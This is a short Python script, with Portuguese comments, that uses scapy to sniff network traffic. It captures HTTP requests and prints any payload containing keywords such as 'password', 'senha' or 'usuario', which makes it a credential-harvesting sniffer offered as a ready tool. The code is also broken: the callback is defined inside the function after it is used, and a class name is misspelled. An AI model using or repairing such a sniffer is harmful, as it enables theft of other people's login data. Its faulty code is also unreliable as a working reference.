import scapy.all as scapy
from scapy.layers import http

def sniffing (interface):
    scapy.sniff(iface=interface, store=False, prn=processar_pacote)

    def processar_pacote(pacote):
        # verifico se o pacote e HTTP
        if pacote.haslayer(http.HTTPRequest):
            
            print("Requisição: " + str(pacote[http.HTTPResquest].Host) + str(pacote[http.HTTPResquest].Path))

            if pacote.haslayer(scapy.Raw):
                conteudo = str(pacote[scapy.Raw].load)
                palavras_de_interesse = ["username", "password", "email", "senha", "usuario"]

                for palavra in palavras_de_interesse:
                    if palavra in conteudo:
                        print("Possivel usuario e senha: " + str(conteudo))
                        break


sniffing('Ethernet')